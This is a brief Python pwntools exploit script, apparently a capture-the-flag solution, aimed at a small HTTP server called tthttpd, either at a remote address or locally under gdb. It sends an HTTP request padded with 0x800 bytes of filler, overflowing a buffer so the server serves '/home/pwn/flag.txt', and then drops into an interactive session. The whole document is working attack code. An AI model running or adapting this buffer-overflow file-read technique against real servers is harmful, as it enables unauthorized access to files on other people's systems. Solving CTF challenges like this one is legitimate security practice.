#!/usr/bin/env python3
from pwn import *


def main():
    if args.REMOTE:
        tube = remote('76.74.170.193', 9006)
    else:
        tube = gdb.debug(['./tthttpd_distfiles/tthttpd.dbg'], gdbscript='''
b respfile
c
''')
    tube.send(b'GET / HTTP/1.1\r\n')
    tube.send(b'A' * 0x800 + b'/home/pwn/flag.txt\0\r\n')
    tube.send(b'\r\n')
    tube.interactive()


if __name__ == '__main__':
    main()
